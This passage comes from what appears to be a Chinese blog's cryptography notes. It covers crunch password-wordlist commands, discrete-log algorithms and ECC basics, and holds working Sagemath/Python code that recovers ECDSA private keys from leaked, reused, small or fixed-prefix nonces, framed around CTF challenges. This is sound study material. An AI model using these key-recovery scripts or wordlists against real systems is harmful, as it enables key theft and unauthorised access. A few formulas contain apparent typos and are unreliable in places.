<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 9 9 -t 201800%%%</span><br></pre></td></tr></table></figure>
<figure>
<img src="/crunch-note/crunch4.png" alt="crunch4">
<figcaption aria-hidden="true">crunch4</figcaption>
</figure></li>
<li><p>多种组合生成 3 个元素的组合，前三位为定义的字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 3 3 -t d@% -p aaa bbb</span><br></pre></td></tr></table></figure>
<figure>
<img src="/crunch-note/crunch5.png" alt="crunch5">
<figcaption aria-hidden="true">crunch5</figcaption>
</figure></li>
<li><p>通过 <code>-l</code> 参数来使 <code>@,%^</code>
等特殊字符输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 7 7 -t p@ss,%^ -l a@aaaaa</span><br></pre></td></tr></table></figure></li>
<li><p><code>-o</code> 参数也可使用 <code>&gt;&gt;</code> 来简化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -d 2@ -t @@@% &gt;&gt; passwdlist.txt</span><br></pre></td></tr></table></figure></li>
<li><p>调用密码库 <code>charset.lst</code> 中的 <code>hex-upper</code>
项目字符，生成 4 位密码</p>
<p><code>charset.lst</code> 文件在目录 <code>/usr/share/crunch/</code>
中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>离散对数笔记</title>
    <url>//discrete-logarithm-note.html</url>
    <content><![CDATA[<h1 id="离散对数">离散对数</h1>
<h2 id="基本问题">基本问题</h2>
<p>离散对数基本问题是解决形如 <span class="math display">\[
a^y\equiv x\pmod{p}
\]</span> 求解 <span class="math inline">\(y\)</span> 的值，我们记作
<span class="math display">\[
y=\log_a{x}\pmod{p}
\]</span> 显然我们会想到朴素的爆破算法，计算每一个 <span class="math inline">\(x+kp\)</span> 对 <span class="math inline">\(a\)</span>
的对数，如果结果是整数，那么这个值恰好是 <span class="math inline">\(y\)</span>。</p>
<p>同时需要知道，<strong>当 <span class="math inline">\(p\)</span>
不为质数时，结果可能不唯一</strong>。</p>
<h2 id="小步大步法baby-step-giant-step">小步大步法（baby-step-giant-step）</h2>
<h3 id="原理">原理</h3>
<p>小步大步法的优势是可以指定一个范围，同时算法内部迭代速度是线性的，算法复杂度是
<span class="math inline">\(\sqrt{p}\)</span>。</p>
<h3 id="代码">代码</h3>
<p>一般使用 Sagemath 自带的算法，需要指定一个范围。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">Fp = GF(p)</span><br><span class="line">a = Fp(getPrime(<span class="number">32</span>))</span><br><span class="line">y = Fp(getPrime(<span class="number">32</span>))</span><br><span class="line">b = a ^ y</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;y = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;b = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = 308246233383857285750026618406218229381</span></span><br><span class="line"><span class="string">a = 2189570113</span></span><br><span class="line"><span class="string">y = 2989311631</span></span><br><span class="line"><span class="string">b = 157894317370901577057351162302392667811</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">result = bsgs(mod(a, p), mod(b, p), bounds=(<span class="number">2</span>**<span class="number">31</span>, <span class="number">2</span>**<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">result = 2989311631</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="pohlig-hellman-算法">Pohlig-Hellman 算法</h2>
<h3 id="原理-1">原理</h3>
<p>在 <span class="math inline">\(GF(p)\)</span>
的<strong>阶</strong>（order）为光滑数时，易分解为较小的域，此时在小域内求解离散对数速度会快得多。</p>
<p>特别地，当 <span class="math inline">\(p\)</span> 为素数时，<span class="math inline">\(p-1\)</span> 一般都为光滑数。</p>
<h3 id="代码-1">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">6897108443075981744484758716081045417854227543713106404294789655180105457499042179717447342593790180943415014044830872925165163457476209819356694244840079</span></span><br><span class="line">b = <span class="number">1315637864146686255246675143589215932218700984880749264689270214639479160648747323586062096067740047809798944996253169402675772469028914904598116394230426</span></span><br><span class="line">a = <span class="number">6789891305297779556556571922812978922375073901749764215969003309869718878076269545304055843125301553103531252334876560433405451108895206969904268456786139</span></span><br><span class="line"></span><br><span class="line">n = p - <span class="number">1</span></span><br><span class="line">primes = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x &lt; <span class="number">2</span> ** <span class="number">32</span>, (base ** exp <span class="keyword">for</span> base, exp <span class="keyword">in</span> factor(n))))</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(n) // <span class="built_in">int</span>(fac)</span><br><span class="line">    dlog = discrete_log(<span class="built_in">pow</span>(b, t, p), <span class="built_in">pow</span>(a, t, p))</span><br><span class="line">    dlogs.append(dlog)</span><br><span class="line">yp = <span class="built_in">int</span>(crt(dlogs, primes))</span><br><span class="line"><span class="built_in">print</span>(yp)</span><br></pre></td></tr></table></figure>
<p>此时需要注意，如果 <span class="math inline">\(y_p\neq y\)</span>，即
<span class="math inline">\(y=y_p+kp\)</span>，那么可能需要小范围爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    res = long_to_bytes(k + i * prod(primes))</span><br><span class="line">    <span class="keyword">if</span> res.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ecdsa 笔记</title>
    <url>//ecdsa-note.html</url>
    <content><![CDATA[<h1 id="ecdsa-原理">ECDSA 原理</h1>
<h2 id="密钥生成">密钥生成</h2>
<h3 id="私钥">私钥</h3>
<p>随机选取一个在 <span class="math inline">\((1,n-1)\)</span>
区间上的整数 <span class="math inline">\(d_A\)</span>
作为<strong>私钥</strong>，其中 <span class="math inline">\(n\)</span>
为椭圆曲线的 <span class="math inline">\(order\)</span>，即椭圆曲线加密方程的模数。</p>
<h3 id="公钥">公钥</h3>
<p><span class="math inline">\(Q=d_A\cdot G\)</span>，其中 <span class="math inline">\(Q\)</span> 即为<strong>公钥</strong>， <span class="math inline">\(G\)</span>
为椭圆曲线上的基点（一般是随机选取的一点）。</p>
<p>由上式可知<strong>公钥</strong>由<strong>私钥</strong>生成。</p>
<h2 id="数字签名">数字签名</h2>
<ol type="1">
<li>随机生成一个临时密钥 <span class="math inline">\(k\)</span></li>
<li>计算 <span class="math inline">\(P=k\cdot G\)</span>，其中 <span class="math inline">\(G\)</span> 为椭圆曲线上的基点</li>
<li>取 <span class="math inline">\(P\)</span> 的 <span class="math inline">\(x\)</span> 轴坐标，<span class="math inline">\(r\equiv x\pmod{n}\)</span></li>
<li>使用哈希函数（可能选取 <span class="math inline">\(sha\)</span>
系列函数较为安全）计算 <span class="math inline">\(m\)</span>
的哈希值（<span class="math inline">\(m\)</span> 一般为签名信息），使用
<span class="math inline">\(\mathrm{H}(m)\)</span>
表示（得到的哈希值应为数值）</li>
<li><span class="math inline">\(s\equiv
k^{-1}\times(\mathrm{H}(m)+d_A\cdot r)\pmod{n}\)</span></li>
<li>最终 <span class="math inline">\((r,s)\)</span> 即为数字签名</li>
</ol>
<h1 id="python-实现">Python 实现</h1>
<p>一般来说仅使用 Python 的话我们需要使用 <code>ecdsa</code> 模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="comment"># 使用 NIST256p 椭圆生成密钥</span></span><br><span class="line">gen = ecdsa.NIST256p.generator</span><br><span class="line"><span class="comment"># 获取该椭圆模数</span></span><br><span class="line">order = gen.order()</span><br><span class="line"><span class="comment"># 生成私钥d_A</span></span><br><span class="line">d_A = random.randrange(<span class="number">1</span>, order-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 生成公私钥对象</span></span><br><span class="line">public_key = ecdsa.ecdsa.Public_key(gen, gen * d_A)</span><br><span class="line">private_key = ecdsa.ecdsa.Private_key(public_key, d_A)</span><br><span class="line"><span class="comment"># 签名信息</span></span><br><span class="line">m = <span class="string">&quot;message&quot;</span></span><br><span class="line">Hm = <span class="built_in">int</span>(hashlib.sha1(message.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest(),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 临时密钥</span></span><br><span class="line">k = random.randrange(<span class="number">1</span>, order-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 签名</span></span><br><span class="line">signature = private_key.sign(Hm, k)</span><br><span class="line">r = signature.r </span><br><span class="line">s = signature.s </span><br></pre></td></tr></table></figure>
<h1 id="ecdsa-实例">ECDSA 实例</h1>
<ul>
<li><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    initiation</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pub_key, priv_key, order, base, secret</span><br><span class="line">    gen = ecdsa.NIST256p.generator</span><br><span class="line">    order = gen.order()</span><br><span class="line">    secret = bytes_to_long(flag[<span class="number">7</span>:-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret)</span><br><span class="line">    priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, nonce</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    sign msg</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    msg = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    sign = priv_key.sign(msg, nonce)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;R:&quot;</span>, <span class="built_in">hex</span>(sign.r)[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S:&quot;</span>, <span class="built_in">hex</span>(sign.s)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">nonce = random.getrandbits(order.bit_length())</span><br><span class="line">sign(<span class="string">b&#x27;welcome to ecdsa&#x27;</span>, nonce)</span><br><span class="line"><span class="built_in">print</span>(nonce)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">R: 7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line"><span class="string">S: a452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line"><span class="string">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>题解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">nonce = <span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">R = <span class="number">0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line">S = <span class="number">0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line">msg = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">n = ecdsa.NIST256p.generator.order()</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">secret = (S * nonce - msg) * gmpy2.invert(R, n) % n</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(secret))</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="ecdsa-攻击">ECDSA 攻击</h1>
<h2 id="k-较小"><span class="math inline">\(k\)</span> 较小</h2>
<p>我们考虑一对随机数 <span class="math inline">\((k_0,k_i)\)</span>，有
<span class="math display">\[
k_0\equiv m_0s_0^{-1}+d_Ar_0s_0^{-1}\pmod{n}\\
k_i\equiv m_is_i^{-1}+d_Ar_is_i^{-1}\pmod{n}
\]</span> 将 <span class="math inline">\(d_A\)</span> 消去，可以得到
<span class="math display">\[
k_0-s_0^{-1}s_ir_0r_i^{-1}\cdot
k_i+s_0^{-1}r_im_ir_i^{-1}-s_0^{-1}m_0\equiv0\pmod{n}
\]</span> 那么可以从中改写为方程 <span class="math display">\[
F_i(X,Y)=X+t_iY+u_i
\]</span> 满足 <span class="math inline">\(F_i(k_i,k_0)=0\pmod{n}\)</span></p>
<p>其中系数一一对应为 <span class="math display">\[
t_i=-s_i^{-1}s_0r_ir_0^{-1}\\
u_i=s_i^{-1}r_im_0r_0^{-1}-s_i^{-1}m_i
\]</span> 不妨构建格 <span class="math display">\[
M=\begin{bmatrix}
N&amp;0&amp;\cdots&amp;0&amp;0&amp;0\\
0&amp;N&amp;\cdots&amp;0&amp;0&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;N&amp;0&amp;0\\
-t_1&amp;-t_2&amp;\cdots&amp;-t_d&amp;1&amp;0\\
-u_1&amp;-u_2&amp;\cdots&amp;-u_d&amp;0&amp;K
\end{bmatrix}
\]</span> 可以证明解向量 <span class="math inline">\((k_1,\cdots,k_d,k_0,K)\)</span> 在格中，其中 <span class="math inline">\(K\)</span> 是 <span class="math inline">\(k\)</span> 的上界。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rs = rs</span><br><span class="line">ss = ss</span><br><span class="line">msgs = msgs</span><br><span class="line">N = ZZ(order)</span><br><span class="line">kbits = <span class="number">64</span></span><br><span class="line">K = <span class="number">2</span> ** kbits</span><br><span class="line">d = <span class="built_in">len</span>(rs) - <span class="number">1</span></span><br><span class="line">ti = []</span><br><span class="line">ui = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d + <span class="number">1</span>):</span><br><span class="line">    t = -inverse_mod(ss[i], N) * ss[<span class="number">0</span>] * rs[i] * inverse_mod(rs[<span class="number">0</span>], N)</span><br><span class="line">    u = inverse_mod(ss[i], N) * rs[i] * msgs[<span class="number">0</span>] * inverse_mod(rs[<span class="number">0</span>], N) - inverse_mod(ss[i], N) * msgs[i]</span><br><span class="line">    ti.append(t)</span><br><span class="line">    ui.append(u)</span><br><span class="line">P = diagonal_matrix([N] * d)</span><br><span class="line">E = diagonal_matrix([<span class="number">1</span>, K])</span><br><span class="line">R = matrix([-vector(ti), -vector(ui)])</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [R, E]], subdivide=<span class="literal">False</span>)</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">0</span>]</span><br><span class="line">shortest_vector = <span class="built_in">list</span>(shortest_vector)</span><br><span class="line">ks = shortest_vector[d:-<span class="number">1</span>] + shortest_vector[:d]</span><br><span class="line">ks</span><br></pre></td></tr></table></figure>
<h2 id="k-复用"><span class="math inline">\(k\)</span> 复用</h2>
<h3 id="原理">原理</h3>
<p>我们可以知道 <span class="math display">\[
s\equiv k^{-1}\times(\mathrm{H}(m)+d_A\cdot r)\pmod{n}
\]</span> 那么当 <span class="math inline">\(k\)</span>
被泄露时，可以攻击得到 <span class="math display">\[
d_A=r^{-1}\times(ks-H(m))
\]</span> 所以 <span class="math inline">\(k\)</span> 需要保密。</p>
<p>但如果 <span class="math inline">\(k\)</span>
被重复用于签名，那么也可以立即恢复密钥。</p>
<p>不妨设 <span class="math inline">\((r,s_1),(r,s_2)\)</span>
为从相同的 <span class="math inline">\(k\)</span> 生成的签名（<span class="math inline">\(r=(kG)_x\)</span>），那么将有 <span class="math display">\[
s_1=k^{-1}(H(m_1)+d_Ar)\\
s_2=k^{-1}(H(m_2)+d_Ar)
\]</span> 推导可得 <span class="math display">\[
k(s_1-s_2)=H(m_1)-H(m_2)
\]</span> 即 <span class="math display">\[
k=(s_1-s_2)^{-1}(H(m_1)-H(m_2))
\]</span> 此时我们就从 <span class="math inline">\(k\)</span>
复用的签名中恢复了 <span class="math inline">\(k\)</span>，从而获取密钥
<span class="math inline">\(d_A\)</span>。</p>
<h2 id="k-固定位"><span class="math inline">\(k\)</span> 固定位</h2>
<h3 id="基本">基本</h3>
<p>当 <span class="math inline">\(k\)</span>
拥有相同的前缀时，我们可以看作 <span class="math display">\[
k_i=k-e_i
\]</span> 即，存在错误的数，这时可以将转化为 HNP 问题。</p>
<p>首先，我们有 <span class="math display">\[
s_i\equiv k_i^{-1}(m_i+d_A\cdot r_i)\pmod{n}
\]</span> 我们变换方程可以得到 <span class="math display">\[
k_i\equiv m_is_i^{-1}+d_Ar_is_i^{-1}\pmod{n}
\]</span> 那么还原 <span class="math inline">\(k_i\)</span> 可以构造格
<span class="math display">\[
M=\begin{bmatrix}
n\\
&amp; n\\
&amp; &amp; \ddots\\
&amp; &amp; &amp; n\\
r_1s_1^{-1} &amp; r_1s_1^{-2} &amp; \cdots &amp; r_ls_l^{-1} &amp; K/n
&amp;\\
m_1s_1^{-1} &amp; m_2s_2^{-1} &amp; \cdots &amp; m_ls_l^{-1} &amp; &amp;
K
\end{bmatrix}
\]</span> 其中 <span class="math inline">\(K\)</span> 是 <span class="math inline">\(k_i\)</span> 的上界。</p>
<p>例如对于两对签名 <span class="math inline">\((r_1,s_1),(r_2,s_2)\)</span>，由以下代码生成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">gen = ecdsa.NIST256p.generator</span><br><span class="line">order = gen.order()</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,order)</span><br><span class="line"> </span><br><span class="line">pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret)</span><br><span class="line">priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)</span><br><span class="line"> </span><br><span class="line">nonce1 = random.randrange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">127</span>)</span><br><span class="line">nonce2 = random.randrange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">127</span>)</span><br><span class="line"> </span><br><span class="line">msg1 = random.randrange(<span class="number">1</span>, order)</span><br><span class="line">msg2 = random.randrange(<span class="number">1</span>, order)</span><br><span class="line"> </span><br><span class="line">sig1 = priv_key.sign(msg1, nonce1)</span><br><span class="line">sig2 = priv_key.sign(msg2, nonce2)</span><br></pre></td></tr></table></figure>
<p>我们获得签名后，使用 sagemath 写出代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">order = order</span><br><span class="line">kbits = <span class="number">127</span></span><br><span class="line">r1, s1 = sig1.r, sig1.s</span><br><span class="line">r2, s2 = sig2.r, sig2.s</span><br><span class="line">msg1 = msg1</span><br><span class="line">msg2 = msg2</span><br><span class="line"></span><br><span class="line">N = ZZ(order)</span><br><span class="line">K = <span class="number">2</span> ^ kbits</span><br><span class="line">P = diagonal_matrix([N] * <span class="number">2</span>)</span><br><span class="line">E = diagonal_matrix([K / N, K])</span><br><span class="line">R = matrix([[ZZ(r1) * inverse_mod(s1, N), ZZ(r2) * inverse_mod(s2, N)],</span><br><span class="line">            [ZZ(msg1) * inverse_mod(s1, N), ZZ(msg2) * inverse_mod(s2, N)]])</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [R, E]])</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">1</span>]</span><br><span class="line">k1, k2 = shortest_vector[:<span class="number">2</span>]</span><br><span class="line"><span class="comment"># dA = shortest_vector[2] / K * N</span></span><br><span class="line">dA = (k1 - ZZ(msg1) * inverse_mod(s1, N)) / (ZZ(r1) * inverse_mod(s1, N)) % N</span><br><span class="line">k1, k2, dA</span><br></pre></td></tr></table></figure>
<p>我们可以从格中寻找到 <span class="math inline">\(k_1,k_2,d_A\)</span>。</p>
<h3 id="固定前缀">固定前缀</h3>
<p>我们考虑一对误差 <span class="math inline">\((e_0,e_i)\)</span>，有
<span class="math display">\[
k+e_0\equiv m_0s_0^{-1}+d_Ar_0s_0^{-1}\pmod{n}\\
k+e_i\equiv m_is_i^{-1}+d_Ar_is_i^{-1}\pmod{n}
\]</span> 相减可得 <span class="math display">\[
e_0-e_i=(m_0s_0^{-1}-m_is_i^{-1})+(r_0s_0^{-1}-r_is_i^{-1})\cdot
d_A\pmod{n}
\]</span> 记 <span class="math inline">\(\tilde{e}_i=e_0-e_i\)</span>，可以从中改写为方程
<span class="math display">\[
F_i(X)=A_iX+B_i
\]</span> 满足 <span class="math inline">\(F_i(d_A)=\tilde{e}_i\pmod{n}\)</span></p>
<p>其中系数一一对应为 <span class="math display">\[
A_i=s_0^{-1}-r_is_i^{-1}\\
B_i=m_0s_0^{-1}-m_is_i^{-1}
\]</span> 不妨构建格 <span class="math display">\[
M=\begin{bmatrix}
N&amp;0&amp;\cdots&amp;0&amp;0&amp;0\\
0&amp;N&amp;\cdots&amp;0&amp;0&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;N&amp;0&amp;0\\
A_1&amp;A_2&amp;\cdots&amp;A_d&amp;K/N&amp;0\\
B_1&amp;B_2&amp;\cdots&amp;B_d&amp;0&amp;K
\end{bmatrix}
\]</span> 可以证明解向量 <span class="math inline">\((\tilde{e}_1,\tilde{e}_2,\cdots,\tilde{e}_d,\frac{Kd_A}{N},K)\)</span>
在格中，其中 <span class="math inline">\(K\)</span> 是 <span class="math inline">\(e_i\)</span> 的上界。</p>
<p>由如下代码产生存在 <span class="math inline">\(d\)</span> 对 <span class="math inline">\((e_0,e_i)\)</span> 误差的签名，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">gen = ecdsa.NIST256p.generator</span><br><span class="line">order = gen.order()</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,order)</span><br><span class="line"></span><br><span class="line">pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret)</span><br><span class="line">priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)</span><br><span class="line">k = getPrime(<span class="number">256</span>)</span><br><span class="line">nonces = []</span><br><span class="line">msgs = []</span><br><span class="line">rs = []</span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    nonce = k + getPrime(<span class="number">16</span>)</span><br><span class="line">    nonces.append(nonce)</span><br><span class="line">    msg = random.randrange(<span class="number">1</span>, order)</span><br><span class="line">    msgs.append(msg)</span><br><span class="line">    sig = priv_key.sign(msg, nonce)</span><br><span class="line">    rs.append(ZZ(sig.r))</span><br><span class="line">    ss.append(ZZ(sig.s))</span><br><span class="line"></span><br><span class="line">nonces, msgs, rs, ss</span><br></pre></td></tr></table></figure>
<p>那么在获取到 <code>msgs, rs, ss</code> 后，使用如下代码寻找解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">order = order</span><br><span class="line">rs = rs</span><br><span class="line">ss = ss</span><br><span class="line">msgs = msgs</span><br><span class="line">kbits = <span class="number">16</span></span><br><span class="line">N = ZZ(order)</span><br><span class="line">K = <span class="number">2</span> ^ kbits</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">len</span>(rs) - <span class="number">1</span></span><br><span class="line">Ai = []</span><br><span class="line">Bi = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d + <span class="number">1</span>):</span><br><span class="line">    Ai.append(ZZ(rs[<span class="number">0</span>]) * inverse_mod(ss[<span class="number">0</span>], N) - ZZ(rs[i]) * inverse_mod(ss[i], N))</span><br><span class="line">    Bi.append(ZZ(msgs[<span class="number">0</span>]) * inverse_mod(ss[<span class="number">0</span>], N) - ZZ(msgs[i]) * inverse_mod(ss[i], N))</span><br><span class="line"></span><br><span class="line">P = diagonal_matrix([N] * d)</span><br><span class="line">E = diagonal_matrix([K / N, K])</span><br><span class="line">R = matrix([Ai, Bi])</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [R, E]], subdivide=<span class="literal">False</span>)</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">1</span>]</span><br><span class="line">errs = shortest_vector[:d]</span><br><span class="line"><span class="comment"># dA = shortest_vector[d] * N / K</span></span><br><span class="line">dA = (errs[<span class="number">0</span>] - Bi[<span class="number">0</span>]) * inverse_mod(Ai[<span class="number">0</span>], N) % N</span><br><span class="line">dA, errs</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，从格中还原的 <span class="math inline">\(d_A\)</span>
可能不准确。</p>
</blockquote>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>ecc</tag>
        <tag>sagemath</tag>
      </tags>
  </entry>
  <entry>
    <title>ECC 笔记</title>
    <url>//ecc-note.html</url>
    <content><![CDATA[<h1 id="ecc-简介">ECC 简介</h1>
<p>椭圆曲线密码学(Elliptic Curve Cryptography，
ECC)，又称<strong>椭圆曲线密码体制</strong>、<strong>椭圆曲线加密算法</strong>等。椭圆曲线加密算法在比特币、目前的二代居民身份证和区块链领域有着广泛的应用。</p>
<p>在很多情况中，ECC在性能(更少的计算量)和带宽(更短的签名和密钥)上都比RSA和离散对数(DL)方案更具有优势。</p>
<p>ECC椭圆曲线加密，它的安全性基于椭圆曲线上的离散对数问题。</p>
<h1 id="ecc-原理">ECC 原理</h1>
<h2 id="ecc-常用椭圆曲线定义">ECC 常用椭圆曲线定义</h2>
<blockquote>
<p><span class="math inline">\(\Z_p\ (p\geq3)\)</span>
上的椭圆曲线指满足以下条件的所有对 <span class="math inline">\((x, y)\in
\Z_p\)</span> 的集合 <span class="math display">\[
y^2\equiv x^3+ax+b\pmod{p}
\]</span> 以及一个无穷大的虚数点<span class="math inline">\(\partial\)</span>，其中 <span class="math display">\[
a,b\in\Z_p
\]</span> 并且满足条件：<span class="math inline">\(p\)</span>
是素数，<span class="math inline">\(\Delta_E=4a^3+27b^2\neq
0\pmod{p}\)</span>。</p>
</blockquote>
<p>密码学应用感兴趣的时定义中给出的基于<strong>素数域</strong>的曲线。如果在
<span class="math inline">\(\Z_p\)</span>
上画出这个椭圆曲线，则得到的从远处看不像是一条曲线。</p>
<h2 id="求解-e_pab">求解 <span class="math inline">\(E_p(a,b)\)</span></h2>
<p>设 <span class="math inline">\(E_p(a,b)\)</span>
表示椭圆曲线上的点集： <span class="math display">\[
\{(x,y)|0\leq x\leq p,0\leq y\leq p, 且x,y均为整数 \}
\]</span> 求 <span class="math inline">\(E_p(a,b)\)</span>
点集步骤：</p>
<ol type="1">
<li>对每一个 <span class="math inline">\(x(0\leq
x&lt;p,x\in\Z)\)</span>，计算 <span class="math inline">\(x^3+ax+b\pmod{p}\)</span></li>
<li>决定以上求得的值在模 <span class="math inline">\(p\)</span>
下是否有平方根，计算 <span class="math inline">\(y^2\pmod{p}\)</span>
<ul>
<li>如果没有，则求曲线上没有与这一相对应的点</li>
<li>如果有，则求出两个平方根</li>
</ul></li>
</ol>
